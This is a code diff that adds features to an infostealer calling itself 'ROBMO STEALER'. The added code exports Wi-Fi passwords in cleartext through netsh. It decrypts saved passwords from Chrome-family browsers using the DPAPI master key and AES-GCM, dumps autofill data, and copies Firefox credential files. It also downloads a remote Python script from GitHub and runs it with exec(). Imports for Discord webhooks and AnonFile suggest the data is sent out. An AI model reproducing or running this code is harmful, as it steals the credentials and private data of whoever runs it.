@@ -49,6 +49,58 @@ from datetime import datetime, timedelta
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
+import os
+from datetime import datetime, timedelta
+from os import getenv, getlogin, listdir, walk
+import sqlite3
+from discord_webhook import DiscordWebhook, DiscordEmbed
+import discord
+import win32crypt
+import shutil
+import command
+import random
+import threading
+import re
+import wmi
+import uuid
+import textwrap
+import psutil
+import glob
+import FireFoxDecrypt
+import requests
+import sys
+import base64
+from base64 import b64decode
+from json import loads
+from regex import findall
+import platform
+import time
+import subprocess
+from pathlib import Path
+import codecs
+import json
+import base64
+from addict import Dict
+import win32crypt
+from Crypto.Cipher import AES
+from datetime import timezone, datetime, timedelta
+import winreg as reg
+from urllib.request import Request, urlopen
+import winreg
+from anonfile import AnonFile
+import getpass
+import zipfile
+import win32clipboard
+import base64
+import pywifi
+import json
+import os
+import shutil
+import sqlite3
+from datetime import datetime, timedelta
+from Crypto.Cipher import AES
+from win32crypt import CryptUnprotectData
+
 #SOURCES
 
 intro = """
@@ -76,7 +128,7 @@ space = "\n"
 
 user = os.path.expanduser("~")
 
-user_folder = os.path.join(user, "𝐔𝐬𝐞𝐫 𝟏")
+user_folder = os.path.join(user, "𝐔𝐬𝐞𝐫")
 
 if not os.path.exists(user_folder):
     os.mkdir(user_folder)
@@ -202,7 +254,6 @@ browsers = {
 
 browser_txt(user_folder, browsers)
 
-#DATA
 
 data_queries = {
     '𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝𝐬': {
@@ -256,10 +307,9 @@ def decrypt_password(buff: bytes, key: bytes) -> str:
 
     return decrypted_pass
 
-
 def save_results(browser_name, type_of_data, content):
     user = os.path.expanduser("~")
-    user_folder = os.path.join(user, "𝐔𝐬𝐞𝐫 𝟏")
+    user_folder = os.path.join(user, "𝐔𝐬𝐞𝐫")
     browser = os.path.join(user_folder, "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", browser_name)
     if not os.path.exists(browser):
         os.makedirs(browser, exist_ok=True)
@@ -268,8 +318,6 @@ def save_results(browser_name, type_of_data, content):
         file_path = os.path.join(browser, f"{type_of_data}.txt")
         with open(file_path, 'w', encoding="utf-8") as file:
             file.write(intro.strip() + "\n\n" + content)
-
-
 
 def get_data(path: str, profile: str, key, type_of_data):
     db_file = f'{path}\\{profile}{type_of_data["file"]}'
@@ -296,10 +344,8 @@ def get_data(path: str, profile: str, key, type_of_data):
     os.remove('temp_db')
     return result
 
-
 def convert_chrome_time(chrome_time):
     return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')
-
 
 def installed_browsers():
     available = []
@@ -307,7 +353,438 @@ def installed_browsers():
         if os.path.exists(browsers[x]):
             available.append(x)
     return available
+############
 
+def create_wifi_folder(user_folder):
+    wifi_folder = os.path.join(user_folder, "𝐖𝐢-𝐟𝐢")
+    
+    if not os.path.exists(wifi_folder):
+        os.makedirs(wifi_folder)
+    
+    return wifi_folder
+
+def export_wifi_profiles(wifi_folder):
+    try:
+        output_file = os.path.join(wifi_folder, "output.txt")
+        with open(output_file, "w") as output:
+            subprocess.run(["netsh", "wlan", "export", "profile", "key=clear", "folder=" + wifi_folder], stdout=output, stderr=output, check=True)
+        return True
+    except subprocess.CalledProcessError:
+        return False
+
+user_folder = os.path.join(os.path.expanduser("~"), "𝐔𝐬𝐞𝐫")
+wifi_folder = create_wifi_folder(user_folder)
+result = export_wifi_profiles(wifi_folder)
+
+if result:
+    os.remove(os.path.join(wifi_folder, "output.txt"))
+
+#######
+
+chrome = {
+    '𝐂𝐡𝐫𝐨𝐦𝐞': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default")
+}
+
+output_folder = os.path.join(os.environ["USERPROFILE"], "𝐔𝐬𝐞𝐫", "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", "𝐂𝐡𝐫𝐨𝐦𝐞")
+
+def create_directory_if_not_exists(directory):
+    if not os.path.exists(directory):
+        os.makedirs(directory)
+
+create_directory_if_not_exists(output_folder)
+
+def get_autofill_data(browser_name, browser_path):
+    try:
+        web_data_db = os.path.join(browser_path, "Web Data")
+        web_data_db_copy = os.path.join(os.getenv("TEMP"), "Web.db")
+        shutil.copy2(web_data_db, web_data_db_copy)
+        conn = sqlite3.connect(web_data_db_copy)
+        cursor = conn.cursor()
+
+        try:
+            cursor.execute("SELECT name, value FROM autofill")
+
+            autofill_data = ""
+            for item in cursor.fetchall():
+                name = item[0]
+                value = item[1]
+                autofill_data += f"⮞ {name}: {value}{robmo}\n"
+
+        except sqlite3.Error:
+            pass
+
+        conn.close()
+        os.remove(web_data_db_copy)
+
+        if autofill_data:
+            with open(os.path.join(output_folder, f'𝐀_{browser_name}.txt'), 'w', encoding='utf-8') as f:
+                f.write(intro + "\n")
+                f.write(autofill_data)
+    except Exception as e:
+        pass
+    
+for browser_name, browser_path in chrome.items():
+    get_autofill_data(browser_name, browser_path)
+#######
+
+edge = {
+    '𝐄𝐝𝐠𝐞': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default")
+}
+
+output_folder = os.path.join(os.environ["USERPROFILE"], "𝐔𝐬𝐞𝐫", "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", "𝐄𝐝𝐠𝐞")
+
+def create_directory_if_not_exists(directory):
+    if not os.path.exists(directory):
+        os.makedirs(directory)
+
+create_directory_if_not_exists(output_folder)
+
+def get_auto_data(browser_name, browser_path):
+    try:
+        web_data_db = os.path.join(browser_path, "Web Data")
+        web_data_db_copy = os.path.join(os.getenv("TEMP"), "Web.db")
+        shutil.copy2(web_data_db, web_data_db_copy)
+        conn = sqlite3.connect(web_data_db_copy)
+        cursor = conn.cursor()
+
+        try:
+            cursor.execute("SELECT name, value FROM autofill")
+
+            autofill_data = ""
+            for item in cursor.fetchall():
+                name = item[0]
+                value = item[1]
+                autofill_data += f"⮞ {name}: {value}\n\n{robmo}\n\n"
+
+        except sqlite3.Error:
+            pass
+
+        conn.close()
+        os.remove(web_data_db_copy)
+
+        if autofill_data:
+            with open(os.path.join(output_folder, f'𝐀_{browser_name}.txt'), 'w', encoding='utf-8') as f:
+                f.write(intro)
+                f.write(autofill_data)
+    except Exception as e:
+        pass
+    
+for browser_name, browser_path in edge.items():
+    get_auto_data(browser_name, browser_path)
+######
+
+opera = {
+    '𝐎𝐩𝐞𝐫𝐚': os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable")
+}
+
+output_folder = os.path.join(os.environ["USERPROFILE"], "𝐔𝐬𝐞𝐫", "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", "𝐎𝐩𝐞𝐫𝐚")
+
+def create_directory_if_not_exists(directory):
+    if not os.path.exists(directory):
+        os.makedirs(directory)
+
+create_directory_if_not_exists(output_folder)
+
+def get_autofill_data(browser_name, browser_path):
+    try:
+        web_data_db = os.path.join(browser_path, "Web Data")
+        web_data_db_copy = os.path.join(os.getenv("TEMP"), "Web.db")
+        shutil.copy2(web_data_db, web_data_db_copy)
+        conn = sqlite3.connect(web_data_db_copy)
+        cursor = conn.cursor()
+
+        try:
+            cursor.execute("SELECT name, value FROM autofill")
+
+            autofill_data = ""
+            for item in cursor.fetchall():
+                name = item[0]
+                value = item[1]
+                autofill_data += f"⮞ {name}: {value}\n\n{robmo}\n\n"
+
+        except sqlite3.Error:
+            pass
+
+        conn.close()
+        os.remove(web_data_db_copy)
+
+        if autofill_data:
+            with open(os.path.join(output_folder, f'𝐀_{browser_name}.txt'), 'w', encoding='utf-8') as f:
+                f.write(intro)
+                f.write(autofill_data)
+    except Exception as e:
+        pass
+    
+for browser_name, browser_path in opera.items():
+    get_autofill_data(browser_name, browser_path)
+
+def get_makey(path: str):
+    if not os.path.exists(path):
+        return None
+
+    with open(path + "\\Local State", "r", encoding="utf-8") as f:
+        local_state = json.load(f)
+
+    encrypted_key = local_state["os_crypt"]["encrypted_key"]
+    encrypted_key = base64.b64decode(encrypted_key)
+    encrypted_key = encrypted_key[5:]
+
+    try:
+        decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        return decrypted_key
+    except Exception as e:
+        print(f"Error decrypting key: {str(e)}")
+        return None
+
+def decrypt_password(buff, master_key):
+    iv = buff[3:15]
+    payload = buff[15:]
+    cipher = AES.new(master_key, AES.MODE_GCM, iv)
+    decrypted_pass = cipher.decrypt(payload)
+    decrypted_pass = decrypted_pass[:-16].decode()
+    return decrypted_pass
+
+def get_saved_passwords(browser_profile_path, master_key):
+    login_data = os.path.join(browser_profile_path, 'Login Data')
+    shutil.copy2(login_data, "LoginData.db")  
+
+    conn = sqlite3.connect("LoginData.db")
+    cursor = conn.cursor()
+
+    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+    login_data = cursor.fetchall()
+
+    decrypted_passwords = []
+    for data in login_data:
+        url, username, password = data
+        password = decrypt_password(password, master_key)
+        decrypted_passwords.append((url, username, password))
+
+    conn.close()
+    os.remove("LoginData.db")
+
+    return decrypted_passwords
+
+def save_passwords_to_file(passwords, output_path, intro):
+    with open(output_path, "w", encoding="utf-8") as f:
+        f.write(intro + robmo + "\n")
+        for url, username, password in passwords:
+            f.write(f"URL: {url}\n")
+            f.write(f"Username: {username}\n")
+            f.write(f"Password: {password}")
+            f.write(robmo + "\n\n")
+
+def opera1():
+    user = os.path.expanduser("~")
+    
+    profile_path = os.path.join(user, "AppData\\Roaming\\Opera Software\\Opera Stable")
+    
+    opera_folder = os.path.join(user, "𝐔𝐬𝐞𝐫\\𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬\\𝐎𝐩𝐞𝐫𝐚")
+    if not os.path.exists(opera_folder):
+        os.makedirs(opera_folder, exist_ok=True)
+    
+    master_key = get_makey(profile_path)
+
+    if master_key:
+        saved_passwords = get_saved_passwords(profile_path, master_key)
+        if saved_passwords:
+            output_path = os.path.join(opera_folder, "𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝𝐬_𝐎.txt")  
+            save_passwords_to_file(saved_passwords, output_path, intro)
+        
+
+opera1()
+#######
+
+operagx = {
+    '𝐎𝐩𝐞𝐫𝐚 𝐆𝐗': os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
+}
+
+output_folder = os.path.join(os.environ["USERPROFILE"], "𝐔𝐬𝐞𝐫", "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", "𝐎𝐩𝐞𝐫𝐚 𝐆𝐗")
+
+def create_directory_if_not_exists(directory):
+    if not os.path.exists(directory):
+        os.makedirs(directory)
+
+create_directory_if_not_exists(output_folder)
+
+def get_autofill_data(browser_name, browser_path):
+    try:
+        web_data_db = os.path.join(browser_path, "Web Data")
+        web_data_db_copy = os.path.join(os.getenv("TEMP"), "Web.db")
+        shutil.copy2(web_data_db, web_data_db_copy)
+        conn = sqlite3.connect(web_data_db_copy)
+        cursor = conn.cursor()
+
+        try:
+            cursor.execute("SELECT name, value FROM autofill")
+
+            autofill_data = ""
+            for item in cursor.fetchall():
+                name = item[0]
+                value = item[1]
+                autofill_data += f"⮞ {name}: {value}\n\n{robmo}\n\n"
+
+        except sqlite3.Error:
+            pass
+
+        conn.close()
+        os.remove(web_data_db_copy)
+
+        if autofill_data:
+            with open(os.path.join(output_folder, f'𝐀_{browser_name}.txt'), 'w', encoding='utf-8') as f:
+                f.write(intro)          
+                f.write(autofill_data)
+    except Exception as e:
+        pass
+    
+for browser_name, browser_path in operagx.items():
+    get_autofill_data(browser_name, browser_path)
+
+def get_master_key(path: str):
+    if not os.path.exists(path):
+        return None
+
+    with open(path + "\\Local State", "r", encoding="utf-8") as f:
+        local_state = json.load(f)
+
+    encrypted_key = local_state["os_crypt"]["encrypted_key"]
+    encrypted_key = base64.b64decode(encrypted_key)
+    encrypted_key = encrypted_key[5:]
+
+    try:
+        decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        return decrypted_key
+    except Exception as e:
+        print(f"Error decrypting key: {str(e)}")
+        return None
+
+def decrypt_password(buff, master_key):
+    iv = buff[3:15]
+    payload = buff[15:]
+    cipher = AES.new(master_key, AES.MODE_GCM, iv)
+    decrypted_pass = cipher.decrypt(payload)
+    decrypted_pass = decrypted_pass[:-16].decode()
+    return decrypted_pass
+
+def get_saved_passwords(browser_profile_path, master_key):
+    login_data = os.path.join(browser_profile_path, 'Login Data')
+    shutil.copy2(login_data, "LoginData.db")  
+
+    conn = sqlite3.connect("LoginData.db")
+    cursor = conn.cursor()
+
+    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+    login_data = cursor.fetchall()
+
+    decrypted_passwords = []
+    for data in login_data:
+        url, username, password = data
+        password = decrypt_password(password, master_key)
+        decrypted_passwords.append((url, username, password))
+
+    conn.close()
+    os.remove("LoginData.db")
+
+    return decrypted_passwords
+
+def save_passwords_to_file(passwords, output_path, intro):
+    with open(output_path, "w", encoding="utf-8") as f:
+        f.write(intro + robmo + "\n")
+        for url, username, password in passwords:
+            f.write(f"URL: {url}\n")
+            f.write(f"Username: {username}\n")
+            f.write(f"Password: {password}")
+            f.write("\n\n▂ ▃ ▄ ▅ ▆ 𝑅𝑂𝐵𝑀𝑂 𝑆𝑇𝐸𝐴𝐿𝐸𝑅 ▇ ▆ ▅ ▄ ▃ ▂" + "\n\n")
+
+def main():
+    user = os.path.expanduser("~")
+    
+    profile_path = os.path.join(user, "AppData\\Roaming\\Opera Software\\Opera GX Stable")
+    
+    opera_folder = os.path.join(user, "𝐔𝐬𝐞𝐫\\𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬\\𝐎𝐩𝐞𝐫𝐚 𝐆𝐗")
+    if not os.path.exists(opera_folder):
+        os.makedirs(opera_folder, exist_ok=True)
+    
+    master_key = get_master_key(profile_path)
+
+    if master_key:
+        saved_passwords = get_saved_passwords(profile_path, master_key)
+        if saved_passwords:
+            output_path = os.path.join(opera_folder, "𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝𝐬_𝐎𝐆𝐗.txt")  
+            save_passwords_to_file(saved_passwords, output_path, intro)
+            
+if __name__ == "__main__":
+    main()  
+#######
+
+
+user = os.path.expanduser("~")
+
+def get_signons(user):
+    git = "https://github.com/matiasb186/Robmo-Stealer/blob/main/signons.sqlite"
+    download = os.path.join("C:/Users", user, "𝐔𝐬𝐞𝐫", "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", "𝐅𝐢𝐫𝐞𝐟𝐨𝐱")
+    if not os.path.exists(download):
+        os.mkdir(download)
+    file = os.path.join(download, "signons.sqlite")
+    response = requests.get(git)
+    if response.status_code == 200:
+        with open(file, 'wb') as file:
+            file.write(response.content)
+            
+
+def fire_profile(user):
+    profiles = os.path.join("C:/Users", user, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
+    
+    for root, dirs, files in os.walk(profiles):
+        for profile in dirs:
+            if 'default-release' in profile:
+                return profile
+    return None
+
+def copy(user, profile, destination):
+    source = os.path.join("C:/Users", user, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles", profile)
+    logins = os.path.join(source, "logins.json")
+    key = os.path.join(source, "key4.db")
+
+    
+    shutil.copy(logins, os.path.join(destination, "logins.json"))
+    shutil.copy(key, os.path.join(destination, "key4.db"))
+    
+firefox_profile = fire_profile(user)
+
+get_signons(user)
+
+copy(user, firefox_profile, os.path.join("C:/Users", user, "𝐔𝐬𝐞𝐫", "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", "𝐅𝐢𝐫𝐞𝐟𝐨𝐱"))
+
+import os
+import requests
+
+user = os.path.expanduser("~")
+download_folder = os.path.join("C:/Users", user, "𝐔𝐬𝐞𝐫", "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", "𝐅𝐢𝐫𝐞𝐟𝐨𝐱")
+
+def download_firefox_script(user):
+    script_url = "https://raw.githubusercontent.com/matiasb186/Robmo-Stealer/main/firefox.py"
+    script_file = os.path.join(download_folder, "firefox.py")
+
+    response = requests.get(script_url)
+    if response.status_code == 200: 
+        with open(script_file, 'wb') as file:
+            file.write(response.content)
+
+def execute_firefox_script():
+    script_file = os.path.join(download_folder, "firefox.py")
+    if os.path.exists(script_file):
+        try:
+            with open(script_file, 'r', encoding='utf-8') as f:
+                exec(f.read())
+        except Exception as e:
+            print(f"Error al ejecutar firefox.py: {str(e)}")
+
+download_firefox_script(user)
+
+execute_firefox_script()
+
+######
 
 if __name__ == '__main__':
     available_browsers = installed_browsers()
